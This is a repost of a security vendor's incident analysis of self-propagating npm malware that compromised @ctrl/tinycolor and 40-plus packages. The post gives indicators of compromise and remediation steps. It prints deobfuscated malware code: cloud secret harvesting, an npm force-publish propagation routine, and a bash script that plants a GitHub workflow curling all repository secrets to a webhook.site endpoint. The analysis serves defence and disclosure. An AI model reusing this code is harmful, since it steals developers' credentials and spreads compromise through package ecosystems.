<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised">Original</a>
    <h1>Self Propagating NPM Malware Compromises over 40 Packages</h1>
    
    <div id="readability-page-1" class="page"><div><div data-blog-post=""><h2>Executive Summary</h2><p>The NPM ecosystem is facing another critical supply chain attack. The popular @ctrl/tinycolor package, which receives over 2 million weekly downloads, has been compromised along with more than 40 other packages across multiple maintainers. This attack demonstrates a concerning evolution in supply chain threats - the malware includes a self-propagating mechanism that automatically infects downstream packages, creating a cascading compromise across the ecosystem. The compromised versions have been removed from npm.</p><p>The incident was discovered by <a href="https://github.com/franky47" target="_blank">@franky47</a>, who promptly notified the community through a <a href="https://github.com/scttcper/tinycolor/issues/256" target="_blank">GitHub issue</a>. </p><p>In this post, we&#39;ll dive deep into the payload&#39;s mechanics, including deobfuscated code snippets, API call traces, and diagrams to illustrate the attack chain. Our analysis reveals a Webpack-bundled script (bundle.js) that leverages Node.js modules for reconnaissance, harvesting, and propagation; targeting Linux/macOS devs with access to NPM/GitHub/cloud creds. </p><h2>Technical Analysis</h2><p>The attack unfolds through a sophisticated multi-stage chain that leverages Node.js&#39;s process.env for opportunistic credential access and employs Webpack-bundled modules for modularity. At the core of this attack is a ~3.6MB minified bundle.js file, which executes asynchronously during npm install. This execution is likely triggered via a hijacked postinstall script embedded in the compromised package.json.</p><p><strong>Self-Propagation Engine</strong>‍</p><p>The malware includes a self-propagation mechanism through the NpmModule.updatePackage function. This function queries the NPM registry API to fetch up to 20 packages owned by the maintainer, then force-publishes patches to these packages. This creates a cascading compromise effect, recursively injecting the malicious bundle into dependent ecosystems across the NPM registry.</p><p><strong>Credential Harvesting</strong>‍</p><p>The malware repurposes open-source tools like TruffleHog to scan the filesystem for high-entropy secrets. It searches for patterns such as AWS keys using regular expressions like AKIA[0-9A-Z]{16}. Additionally, the malware dumps the entire process.env, capturing transient tokens such as GITHUB_TOKEN and AWS_ACCESS_KEY_ID.</p><p>For cloud-specific operations, the malware enumerates AWS Secrets Manager using SDK pagination and accesses Google Cloud Platform secrets via the @google-cloud/secret-manager API. The malware specifically targets the following credentials:</p><ol role="list"><li>GitHub personal access tokens</li><li>AWS access keys (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)</li><li>Google Cloud Platform service credentials</li><li>Azure credentials</li><li>Cloud metadata endpoints</li><li>NPM authentication tokens</li></ol><p><strong>Persistence Mechanism</strong>‍</p><p>The malware establishes persistence by injecting a GitHub Actions workflow file (.github/workflows/shai-hulud-workflow.yml) via a base64-encoded bash script. This workflow triggers on push events and exfiltrates repository secrets using the expression ${{ toJSON(secrets) }} to a command and control endpoint. The malware creates branches by force-merging from the default branch (refs/heads/shai-hulud) using GitHub&#39;s /git/refs endpoint.</p><p><strong>Data Exfiltration</strong>‍</p><p>The malware aggregates harvested credentials into a JSON payload, which is pretty-printed for readability. It then uploads this data to a new public repository named <code>Shai-Hulud</code> via the GitHub /user/repos API.</p><p>The entire attack design assumes Linux or macOS execution environments, checking for os.platform() === &#39;linux&#39; || &#39;darwin&#39;. It deliberately skips Windows systems. For a visual breakdown, see the attack flow diagram below:</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/68c9067c02ea9a2f037ae6ad_Screenshot%202025-09-15%20at%2011.40.28%E2%80%AFPM.png" loading="lazy" alt=""/></p></figure><h2>Attack Mechanism</h2><p>The compromise begins with a sophisticated minified JavaScript bundle injected into affected packages like @ctrl/tinycolor. This is not rudimentary malware but rather a sophisticated modular engine that uses Webpack chunks to organize OS utilities, cloud SDKs, and API wrappers.</p><p>The payload imports six core modules, each serving a specific function in the attack chain.</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/68c91b23b911622bbe928502_Screenshot%202025-09-16%20at%201.08.52%E2%80%AFAM.png" loading="lazy" alt=""/></p></figure><h3>OS Recon (Module 71197)</h3><p>This module calls getSystemInfo() to build a comprehensive system profile containing platform, architecture, platformRaw, and archRaw information. It dumps the entire process.env, capturing sensitive environment variables including AWS_ACCESS_KEY_ID, GITHUB_TOKEN, and other credentials that may be present in the environment.</p><h3>Credential Harvesting Across Clouds</h3><h4>AWS (Module 56686)</h4><p>The AWS harvesting module validates credentials using the STS AssumeRoleWithWebIdentityCommand. It then enumerates secrets using the @aws-sdk/client-secrets-manager library.</p><pre contenteditable="false"><code><span>// Deobfuscated AWS harvest snippet</span><span>
</span><span></span><span>async</span><span> </span><span>getAllSecretValues</span><span>(</span><span>)</span><span> {
</span><span>  </span><span>const</span><span> secrets = [];
</span><span>  </span><span>let</span><span> nextToken;
</span><span>  </span><span>do</span><span> {
</span><span>    </span><span>const</span><span> resp = </span><span>await</span><span> client.send(</span><span>new</span><span> ListSecretsCommand({ </span><span>NextToken</span><span>: nextToken }));
</span><span>    </span><span>for</span><span> (</span><span>const</span><span> secret </span><span>of</span><span> resp.SecretList || []) {
</span><span>      </span><span>const</span><span> value = </span><span>await</span><span> client.send(</span><span>new</span><span> GetSecretValueCommand({ </span><span>SecretId</span><span>: secret.ARN }));
</span><span>      secrets.push({ </span><span>ARN</span><span>: secret.ARN, </span><span>SecretString</span><span>: value.SecretString, </span><span>SecretBinary</span><span>: atob(value.SecretBinary) });  </span><span>// Base64 decode binaries</span><span>
</span>    }
<!-- -->    nextToken = resp.NextToken;
<span>  } </span><span>while</span><span> (nextToken);
</span><span>  </span><span>return</span><span> secrets;
</span>}</code></pre><p>The module handles errors such as DecryptionFailure or ResourceNotFoundException silently through decorateServiceException wrappers. It targets all AWS regions via endpoint resolution.</p><h4>GCP (Module 9897)<strong>‍</strong></h4><p>The GCP module uses @google-cloud/secret-manager to list secrets matching the pattern projects/<em>/secrets/</em>. It implements pagination using nextPageToken and returns objects containing the secret name and decoded payload. The module fails silently on PERMISSION_DENIED errors without alerting the user.</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/68c9017078b319a3d4fac17a_Screenshot%202025-09-15%20at%2011.18.57%E2%80%AFPM.png" loading="lazy" alt=""/></p></figure><h4><strong>Filesystem Secret Scanning (Module 94913)</strong></h4><p>This module spawns TruffleHog via child_process.exec(&#39;trufflehog filesystem / --json&#39;) to scan the entire filesystem. It parses the output for high-entropy matches, such as AWS keys found in ~/.aws/credentials.</p><h3>Propagation Mechanics</h3><h4>NPM Pivot (Module 40766)</h4><p>The NPM propagation module parses NPM_TOKEN from either ~/.npmrc or environment variables. After validating the token via the /whoami endpoint, it queries /v1/search?text=maintainer:${username}&amp;size=20 to retrieve packages owned by the maintainer.</p><pre contenteditable="false"><code><span>// Deobfuscated NPM update snippet</span><span>
</span><span></span><span>async</span><span> </span><span>updatePackage</span><span>(</span><span>pkg</span><span>)</span><span> {
</span><span>  </span><span>// Patch package.json (add self as dep?) and publish</span><span>
</span><span>  </span><span>await</span><span> exec(</span><span>`npm version patch --force &amp;&amp; npm publish --access public --token </span><span>${token}</span><span>`</span><span>);
</span>}</code></pre><p>This creates a cascading effect where an infected package leads to compromised maintainer credentials, which in turn infects all other packages maintained by that user.</p><h4>GitHub Backdoor (Module 82036)<strong>‍</strong></h4><p>The GitHub backdoor module authenticates via the /user endpoint, requiring repo and workflow scopes. After listing organizations, it injects malicious code via a bash script (Module 941).</p><p>Here is the line-by-line bash script deconstruction:</p><pre contenteditable="false"><code><span># Deobfuscated Code snippet</span><span>
</span><span></span><span>#!/bin/bash</span><span>
</span><span>GITHUB_TOKEN=</span><span>&#34;</span><span>$1</span><span>&#34;</span><span>
</span><span>BRANCH_NAME=</span><span>&#34;shai-hulud&#34;</span><span>
</span><span>FILE_NAME=</span><span>&#34;.github/workflows/shai-hulud-workflow.yml&#34;</span><span>
</span>
<span>FILE_CONTENT=$(cat &lt;&lt;</span><span>&#39;EOF&#39;</span><span>
</span><span>on: push  </span><span># Trigger on any push</span><span>
</span><span></span><span>jobs</span><span>: process
</span>  runs-on: ubuntu-latest
<!-- -->  steps:
<span>  - run: curl -d </span><span>&#34;</span><span>$CONTENTS</span><span>&#34;</span><span> https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7;  </span><span># C2 exfil</span><span>
</span><span>         </span><span>echo</span><span> </span><span>&#34;</span><span>$CONTENTS</span><span>&#34;</span><span> | base64 -w 0 | base64 -w 0  </span><span># Double-base64 for evasion</span><span>
</span><span>    env: CONTENTS: </span><span>${{ toJSON(secrets) }</span><span>}  </span><span># Dumps all repo secrets (GITHUB_TOKEN, AWS keys, etc.)</span><span>
</span>EOF
<!-- -->)
<!-- -->
<span></span><span>github_api</span><span>() { curl -s -X </span><span>&#34;</span><span>$1</span><span>&#34;</span><span> -H </span><span>&#34;Authorization: token </span><span>$GITHUB_TOKEN</span><span>&#34;</span><span> ... </span><span>&#34;$API_BASE</span><span>$2</span><span>&#34;</span><span> }
</span>
<span>REPOS_RESPONSE=$(github_api GET </span><span>&#34;/user/repos?affiliation=owner,collaborator,organization_member&amp;since=2025-01-01T00:00:00Z&amp;per_page=100&#34;</span><span>)
</span>
<span></span><span>while</span><span> IFS= </span><span>read</span><span> -r repo; </span><span>do</span><span>
</span><span>  </span><span># Get default branch SHA</span><span>
</span><span>  REF_RESPONSE=$(github_api GET </span><span>&#34;/repos/</span><span>$REPO_FULL_NAME</span><span>/git/ref/heads/</span><span>$DEFAULT_BRANCH</span><span>&#34;</span><span>)
</span><span>  BASE_SHA=$(jq -r </span><span>&#39;.object.sha&#39;</span><span> &lt;&lt;&lt; </span><span>&#34;</span><span>$REF_RESPONSE</span><span>&#34;</span><span>)
</span>
<span>  BRANCH_DATA=$(jq -n </span><span>&#39;{ref: &#34;refs/heads/shai-hulud&#34;, sha: &#34;$BASE_SHA&#34;}&#39;</span><span>)
</span><span>  github_api POST </span><span>&#34;/repos/</span><span>$REPO_FULL_NAME</span><span>/git/refs&#34;</span><span> </span><span>&#34;</span><span>$BRANCH_DATA</span><span>&#34;</span><span>  </span><span># Handles &#34;already exists&#34; gracefully</span><span>
</span>
<span>  FILE_DATA=$(jq -n </span><span>&#39;{message: &#34;Add workflow&#34;, content: &#34;$(base64 &lt;&lt;&lt; &#34;$FILE_CONTENT&#34;)&#34;, branch: &#34;shai-hulud&#34;}&#39;</span><span>)
</span><span>  github_api PUT </span><span>&#34;/repos/</span><span>$REPO_FULL_NAME</span><span>/contents/</span><span>$FILE_NAME</span><span>&#34;</span><span> </span><span>&#34;</span><span>$FILE_DATA</span><span>&#34;</span><span>  </span><span># Overwrites if exists</span><span>
</span><span></span><span>done</span></code></pre><p>This mechanism ensures persistence, as secrets are exfiltrated to the command and control server on the next push event.</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/68c9023a6be9e141d81d5a7e_Screenshot%202025-09-15%20at%2011.22.27%E2%80%AFPM.png" loading="lazy" alt=""/></p></figure><h3><strong>Exfiltration</strong>‍</h3><p>The malware builds a comprehensive JSON payload containing system information, environment variables, and data from all modules. It then creates a public repository via the GitHub /repos POST endpoint using the function <code>makeRepo(&#39;Shai-Hulud&#39;)</code>. The repository is public by default to ensure easy access for the command and control infrastructure.</p><p>The attack employs several evasion techniques including silent error handling (swallowed via catch {} blocks), no logging output, and disguising TruffleHog execution as a legitimate &#34;security scan.&#34;</p><h2>Indicators of Compromise</h2><p>The following indicators can help identify systems affected by this attack:</p><h3>GitHub Search Queries for Detection</h3><p>Use these GitHub search queries to identify potentially compromised repositories across your organization:</p><h4>Search for malicious workflow file</h4><p>Replace <code>ACME</code> with your GitHub organization name and use the following GitHub search query to discover all instance of <code>shai-hulud-workflow.yml</code> in your GitHub environment.</p><p><a href="https://github.com/search?q=org%3AACME+path%3A**%2Fshai-hulud-workflow.yml&amp;type=code" target="_blank">https://github.com/search?q=org%3AACME+path%3A**%2Fshai-hulud-workflow.yml&amp;type=code</a></p><h4>Search for malicious branch</h4><p>To find malicious branches, you can use the following Bash script:</p><pre contenteditable="false"><code><span># List all repos and check for shai-hulud branch</span><span>
</span><span>gh repo list YOUR_ORG_NAME --</span><span>limit</span><span> 1000 --json nameWithOwner --jq </span><span>&#39;.[].nameWithOwner&#39;</span><span> | </span><span>while</span><span> </span><span>read</span><span> repo; </span><span>do</span><span>
</span><span>  gh api </span><span>&#34;repos/</span><span>$repo</span><span>/branches&#34;</span><span> --jq </span><span>&#39;.[] | select(.name == &#34;shai-hulud&#34;) | &#34;&#39;</span><span>$repo</span><span>&#39; has branch: &#34; + .name&#39;</span><span>
</span><span></span><span>done</span></code></pre><h3>File Hashes</h3><ul role="list"><li>The malicious bundle.js file has a SHA-256 hash of: <code>46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09</code></li></ul><h3>Network Indicators</h3><ul role="list"><li>Exfiltration endpoint: <code>https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7</code></li></ul><h3>File System Indicators</h3><ul role="list"><li>Presence of malicious workflow file: <code>.github/workflows/shai-hulud-workflow.yml</code></li></ul><h3>Suspicious Function Calls</h3><ul role="list"><li>Calls to <code>NpmModule.updatePackage</code> function</li></ul><h3>Suspicious API Calls</h3><ul role="list"><li>AWS API calls to <code>secretsmanager.*.amazonaws.com</code> endpoints, particularly <code>BatchGetSecretValueCommand</code></li><li>GCP API calls to <code>secretmanager.googleapis.com</code></li><li>NPM registry queries to <code>registry.npmjs.org/v1/search</code></li><li>GitHub API calls to <code>api.github.com/repos</code></li></ul><h3>Suspicious Process Executions</h3><ul role="list"><li>TruffleHog execution with arguments <code>filesystem /</code></li><li>NPM publish commands with <code>--force</code> flag</li><li>Curl commands targeting webhook.site domains</li></ul><h2>Affected Packages</h2><p>The following packages have been confirmed as compromised:</p><div>


    


    <table>
        <thead>
            <tr>
                <th>Package Name</th>
                <th>Version(s)</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td>@ctrl/tinycolor</td>
                <td>4.1.1, 4.1.2</td>
            </tr>
            <tr>
                <td>angulartics2</td>
                <td>14.1.2</td>
            </tr>
            <tr>
                <td>@ctrl/deluge</td>
                <td>7.2.2</td>
            </tr>
            <tr>
                <td>@ctrl/golang-template</td>
                <td>1.4.3</td>
            </tr>
            <tr>
                <td>@ctrl/magnet-link</td>
                <td>4.0.4</td>
            </tr>
            <tr>
                <td>@ctrl/ngx-codemirror</td>
                <td>7.0.2</td>
            </tr>
            <tr>
                <td>@ctrl/ngx-csv</td>
                <td>6.0.2</td>
            </tr>
            <tr>
                <td>@ctrl/ngx-emoji-mart</td>
                <td>9.2.2</td>
            </tr>
            <tr>
                <td>@ctrl/ngx-rightclick</td>
                <td>4.0.2</td>
            </tr>
            <tr>
                <td>@ctrl/qbittorrent</td>
                <td>9.7.2</td>
            </tr>
            <tr>
                <td>@ctrl/react-adsense</td>
                <td>2.0.2</td>
            </tr>
            <tr>
                <td>@ctrl/shared-torrent</td>
                <td>6.3.2</td>
            </tr>
            <tr>
                <td>@ctrl/torrent-file</td>
                <td>4.1.2</td>
            </tr>
            <tr>
                <td>@ctrl/transmission</td>
                <td>7.3.1</td>
            </tr>
            <tr>
                <td>@ctrl/ts-base32</td>
                <td>4.0.2</td>
            </tr>
            <tr>
                <td>encounter-playground</td>
                <td>0.0.5</td>
            </tr>
            <tr>
                <td>json-rules-engine-simplified</td>
                <td>0.2.4, 0.2.1</td>
            </tr>
            <tr>
                <td>koa2-swagger-ui</td>
                <td>5.11.2, 5.11.1</td>
            </tr>
            <tr>
                <td>@nativescript-community/gesturehandler</td>
                <td>2.0.35</td>
            </tr>
            <tr>
                <td>@nativescript-community/sentry</td>
                <td>4.6.43</td>
            </tr>
            <tr>
                <td>@nativescript-community/text</td>
                <td>1.6.13</td>
            </tr>
            <tr>
                <td>@nativescript-community/ui-collectionview</td>
                <td>6.0.6</td>
            </tr>
            <tr>
                <td>@nativescript-community/ui-drawer</td>
                <td>0.1.30</td>
            </tr>
            <tr>
                <td>@nativescript-community/ui-image</td>
                <td>4.5.6</td>
            </tr>
            <tr>
                <td>@nativescript-community/ui-material-bottomsheet</td>
                <td>7.2.72</td>
            </tr>
            <tr>
                <td>@nativescript-community/ui-material-core</td>
                <td>7.2.76</td>
            </tr>
            <tr>
                <td>@nativescript-community/ui-material-core-tabs</td>
                <td>7.2.76</td>
            </tr>
            <tr>
                <td>ngx-color</td>
                <td>10.0.2</td>
            </tr>
            <tr>
                <td>ngx-toastr</td>
                <td>19.0.2</td>
            </tr>
            <tr>
                <td>ngx-trend</td>
                <td>8.0.1</td>
            </tr>
            <tr>
                <td>react-complaint-image</td>
                <td>0.0.35</td>
            </tr>
            <tr>
                <td>react-jsonschema-form-conditionals</td>
                <td>0.3.21</td>
            </tr>
            <tr>
                <td>react-jsonschema-form-extras</td>
                <td>1.0.4</td>
            </tr>
            <tr>
                <td>rxnt-authentication</td>
                <td>0.0.6</td>
            </tr>
            <tr>
                <td>rxnt-healthchecks-nestjs</td>
                <td>1.0.5</td>
            </tr>
            <tr>
                <td>rxnt-kue</td>
                <td>1.0.7</td>
            </tr>
            <tr>
                <td>swc-plugin-component-annotate</td>
                <td>1.9.2</td>
            </tr>
            <tr>
                <td>ts-gaussian</td>
                <td>3.0.6</td>
            </tr>
        </tbody>
    </table>

</div><h2>Immediate Actions Required</h2><p>If you use any of the affected packages, take these actions immediately:</p><h3>Identify and Remove Compromised Packages</h3><pre contenteditable="false"><code><span># Check for affected packages in your project</span><span>
</span>npm ls @ctrl/tinycolor
<!-- -->
<span></span><span># Remove compromised packages</span><span>
</span>npm uninstall @ctrl/tinycolor
<!-- -->
<span></span><span># Search for the known malicious bundle.js by hash</span><span>
</span><span>find . -</span><span>type</span><span> f -name </span><span>&#34;*.js&#34;</span><span> -</span><span>exec</span><span> sha256sum {} \; | grep </span><span>&#34;46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09&#34;</span></code></pre><p>‍</p><h3>Clean Infected Repositories</h3><h4>Remove Malicious GitHub Actions Workflow</h4><pre contenteditable="false"><code><span># Check for and remove the backdoor workflow</span><span>
</span>rm -f .github/workflows/shai-hulud-workflow.yml
<!-- -->
<span></span><span># Look for suspicious &#39;shai-hulud&#39; branches in all repositories</span><span>
</span>git ls-remote --heads origin | grep shai-hulud
<!-- -->
<span></span><span># Delete any malicious branches found</span><span>
</span>git push origin --delete shai-hulud</code></pre><p>‍</p><h3>Rotate All Credentials Immediately</h3><p>The malware harvests credentials from multiple sources. Rotate ALL of the following:</p><ul role="list"><li>NPM tokens (automation and publish tokens)</li><li>GitHub personal access tokens</li><li>GitHub Actions secrets in all repositories</li><li>SSH keys used for Git operations</li><li>AWS IAM credentials, access keys, and session tokens</li><li>Google Cloud service account keys and OAuth tokens</li><li>Azure service principals and access tokens</li><li>Any credentials stored in AWS Secrets Manager or GCP Secret Manager</li><li>API keys found in environment variables</li><li>Database connection strings</li><li>Third-party service tokens</li><li>CI/CD pipeline secrets</li></ul><h3>Audit Cloud Infrastructure for Compromise</h3><p>Since the malware specifically targets AWS Secrets Manager and GCP Secret Manager, you need to audit your cloud infrastructure for unauthorized access. The malware uses API calls to enumerate and exfiltrate secrets, so reviewing audit logs is critical to understanding the scope of compromise.</p><h4>AWS Security Audit</h4><p>Start by examining your CloudTrail logs for any suspicious secret access patterns. Look specifically for BatchGetSecretValue, ListSecrets, and GetSecretValue API calls that occurred during the time window when the compromised package may have been installed. Also generate and review IAM credential reports to identify any unusual authentication patterns or newly created access keys.</p><pre contenteditable="false"><code><span># Check CloudTrail for suspicious secret access</span><span>
</span>aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=BatchGetSecretValue
<!-- -->aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ListSecrets
<!-- -->aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue
<!-- -->
<span></span><span># Review IAM credential reports for unusual activity</span><span>
</span><span>aws iam get-credential-report --query </span><span>&#39;Content&#39;</span></code></pre><h4>GCP Security Audit</h4><p>For Google Cloud Platform, review your audit logs for any access to the Secret Manager service. The malware uses the @google-cloud/secret-manager library to enumerate secrets, so look for unusual patterns of secret access. Additionally, check for any unauthorized service account key creation, as these could be used for persistent access.</p><pre contenteditable="false"><code><span># Review secret manager access logs
</span><span>gcloud logging read </span><span>&#34;resource.type=secretmanager.googleapis.com&#34;</span><span> --limit=</span><span>50</span><span> --format=json
</span>
<span># Check </span><span>for</span><span> unauthorized service account key creation
</span><span>gcloud logging read </span><span>&#34;protoPayload.methodName=google.iam.admin.v1.CreateServiceAccountKey&#34;</span></code></pre><h3>Monitor for Active Exploitation</h3><h4>Network Monitoring</h4><ul role="list"><li>Block outbound connections to <code>webhook.site</code> domains immediately</li><li>Monitor firewall logs for connections to <code>https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7</code></li></ul><h3>Implement Security Controls</h3><h4>GitHub Security Hardening</h4><ul role="list"><li>Review and remove unnecessary GitHub Apps and OAuth applications</li><li>Audit all repository webhooks for unauthorized additions</li><li>Check deploy keys and repository secrets for all projects</li><li>Enable branch protection rules to prevent force-pushes</li><li>Turn on GitHub Secret Scanning alerts</li><li>Enable Dependabot security updates</li></ul><h4>Ongoing Monitoring</h4><ul role="list"><li>Set up alerts for any new npm publishes from your organization</li><li>Monitor CloudTrail/GCP audit logs for secret access patterns</li><li>Implement regular credential rotation policies</li><li>Use separate, limited-scope tokens for CI/CD pipelines</li></ul><p>‍</p><h3>For StepSecurity Enterprise Customers</h3><p>The following steps are applicable only for StepSecurity enterprise customers. If you are not an existing enterprise customer, you can start our 14 day free trial by installing <a href="https://docs.stepsecurity.io/artifact-monitor" target="_blank">the StepSecurity GitHub App</a> to complete the following recovery step.</p><h4>‍</h4><p><a href="https://www.stepsecurity.io/blog/introducing-the-npm-package-cooldown-check" target="_blank">The NPM Cooldown check</a> automatically fails a pull request if it introduces an npm package version that was released within the organization’s configured cooldown period (default: 2 days). Once the cooldown period has passed, the check will clear automatically with no action required. The rationale is simple - most supply chain attacks are detected within the first 24 hours of a malicious package release, and the projects that get compromised are often the ones that rushed to adopt the version immediately. By introducing a short waiting period before allowing new dependencies, teams can reduce their exposure to fresh attacks while still keeping their dependencies up to date.</p><p><a href="https://github.com/step-security/test-reporting/pull/16/checks?check_run_id=49850926488" target="_blank">https://github.com/step-security/test-reporting/pull/16/checks?check_run_id=49850926488</a></p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/68bf0ba9eb58ed09a40a6832_Screenshot%202025-09-08%20at%209.59.17%E2%80%AFAM.png" loading="lazy" alt=""/></p></figure><h4>Discover Pull Requests upgrading to compromised npm packages</h4><p>We have added a new control specifically to detect pull requests that upgraded to these compromised packages. You can find the new control on the StepSecurity dashboard.</p><p>‍</p><h4>Use StepSecurity Harden-Runner to detect compromised dependencies in CI/CD</h4><p>StepSecurity Harden-Runner adds runtime security monitoring to your GitHub Actions workflows, providing visibility into network calls, file system changes, and process executions during CI/CD runs. Harden-Runner detects the compromised nx packages when they are used in CI/CD. Here is a sample Harden-Runner insights page demonstrating this detection:</p><p><a href="https://app.stepsecurity.io/github/actions-security-demo/compromised-packages/actions/runs/17259145119">https://app.stepsecurity.io/github/actions-security-demo/compromised-packages/actions/runs/17259145119</a></p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/68af60ec28c0c2eec02c4d1f_Screenshot%202025-08-27%20at%2012.47.35%E2%80%AFPM.png" loading="lazy" alt=""/></p></figure><p>If you&#39;re already using Harden-Runner, we strongly recommend you review recent anomaly detections in your Harden-Runner dashboard. You can get started with Harden-Runner by following the guide at <a href="https://docs.stepsecurity.io/harden-runner">https://docs.stepsecurity.io/harden-runner</a>.</p><h4>Use StepSecurity Artifact Monitor to detect software releases outside of authorized pipelines</h4><p>StepSecurity Artifact Monitor provides real-time detection of unauthorized package releases by continuously monitoring your artifacts across package registries. This tool would have flagged this incident by detecting that the compromised versions were published outside of the project&#39;s authorized CI/CD pipeline. The monitor tracks release patterns, verifies provenance, and alerts teams when packages are published through unusual channels or from unexpected locations. By implementing Artifact Monitor, organizations can catch supply chain compromises within minutes rather than hours or days, significantly reducing the window of exposure to malicious packages.</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/687df9387e6b08fe8bd27e5c_image.jpeg" loading="lazy" alt=""/></p></figure><p>Learn more about implementing Artifact Monitor in your security workflow at <a href="https://docs.stepsecurity.io/artifact-monitor" target="_blank">https://docs.stepsecurity.io/artifact-monitor</a>.</p><h2>Reference</h2><p><a href="https://github.com/scttcper/tinycolor/issues/256" target="_blank">GitHub Issue</a></p><p><a href="https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages" target="_blank">Socket.dev Blog Post</a></p><p>‍</p></div></div></div>
  </body>
</html>
